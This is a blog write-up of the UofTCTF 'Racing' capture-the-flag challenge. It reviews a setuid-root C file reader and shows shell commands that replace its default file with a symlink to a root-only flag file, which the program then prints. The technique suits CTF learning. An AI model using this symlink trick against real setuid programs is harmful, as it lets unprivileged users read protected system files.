---
title: UofTCTF - Racing
published: 2025-01-14
description: 'This challenge is a misc chall on my first ctf ever ! '
image: ''
tags: [UofTCTF,]
category: 'misc'
draft: false 
lang: ''
---

# Intro


First of all, let's take a look at the challenge : 
<br/>
![](../../assets/Racing/Pasted%20image.png)

Nothing really interesting but they gave us a copy of the binary running on the machine.

When we connect to the machine, we can see a `flag.txt` that we can't read. So, we can imagine that the challenge is to exploit the binary to read `flag.txt`.
Lets review the code : 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    if (setuid(0) != 0)
    {
        perror("Error setting UID");
        return EXIT_FAILURE;
    }

    char *fn = "/home/user/permitted";
    char buffer[128];
    char f[128];
    FILE *fp;

    if (!access(fn, R_OK))
    {
        printf("Enter file to read: ");
        fgets(f, sizeof(f), stdin);
        f[strcspn(f, "\n")] = 0;

        if (strstr(f, "flag") != NULL)
        {
            printf("Can't read the 'flag' file.\n");
            return 1;
        }

        if (strlen(f) == 0)
        {
            fp = fopen(fn, "r");
        }
        else
        {
            fp = fopen(f, "r");
        }

        fread(buffer, sizeof(char), sizeof(buffer) - 1, fp);
        fclose(fp);
        printf("%s\n", buffer);
        return 0;
    }
    else
    {
        printf("Cannot read file.\n");
        return 1;
    }
}

```

I'm not a C expert but I understood that this code asks us for a file to read with `root permissions` : 

```c
//here, the program starts by upgrading the process privileges to root
if (setuid(0) != 0)
```

```c
printf("Enter file to read: ");
        fgets(f, sizeof(f), stdin);
        f[strcspn(f, "\n")] = 0;
```

But we can't read directly the flag file : 

```c
if (strstr(f, "flag") != NULL)
        {
            printf("Can't read the 'flag' file.\n");
            return 1;
        }
```

# Exploit

Something more interesting is the fact that if we don't specify any file, the code will read the file at `"/home/user/permitted"` : 

```c
char *fn = "/home/user/permitted";
```

```c
//here, f is the result of the user input.
if (strlen(f) == 0)
        {
            fp = fopen(fn, "r");
        }
        else
        {
            fp = fopen(f, "r");
        }
```

So, my idea was to link the "permitted" file to flag.txt with a `symbolic link`, as we have root privileges by running the program (So we can read the flag file, which is owned and only readable by root).


```shell
User@containerssh-hblmc:/challenge$ rm /home/user/permitted
User@containerssh-hblmc:/challenge$ ln -s /flag.txt /home/user/permitted
```
:::important
If you're not familiar with symbolic links, think of them as a shortcut on the desktop: they are special files that point to another file. If we open this link, we can access the original file. If the original file is deleted or moved, the link no longer works.

:::

With this, if we don't specify any file, the program will try to read `/home/user/permitted`, but with the symbolic link, it will instead read the `flag.txt` file."

Lets run the code now : 

```shell
User@containerssh-hblmc:/challenge$ ./chall
Enter file to read : 
uoftctf{r4c3_c0nd1t10n5_4r3_c00l}
```

Bingo ! we have the flag ! 



